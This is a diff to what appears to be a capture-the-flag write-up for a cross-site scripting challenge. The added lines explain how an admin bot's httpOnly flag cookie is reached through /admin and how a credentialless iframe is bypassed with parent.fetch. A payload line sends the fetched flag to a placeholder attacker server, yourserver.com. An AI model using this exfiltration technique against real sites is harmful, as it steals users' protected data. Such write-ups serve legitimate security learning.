@@ -85,7 +85,10 @@ await page.setCookie({
 ```
 
 We can't get the flag via document.cookie because of `httpOnly` and we can't get the flag in a request header because of `sameSite=Lax`.
+
 Since the bot can access `/admin` which returns the flag (cookie) we will let the bot use it to expose the flag value and simply send it to our server.
+
+The iframe is `credentialless` which means it doesn't have access to its regular origin's network, cookies, and storage data, so we will use `parent.fetch` instead of `fetch`
 
 ## Payload
 
@@ -96,4 +99,4 @@ fetch(`http://yourserver.com?flag=${await resp.text()}`)
 </script>
 ```
 
-note: replace `http://localhost:3000` with instance ip 
+note: replace `http://localhost:3000` with instance ip
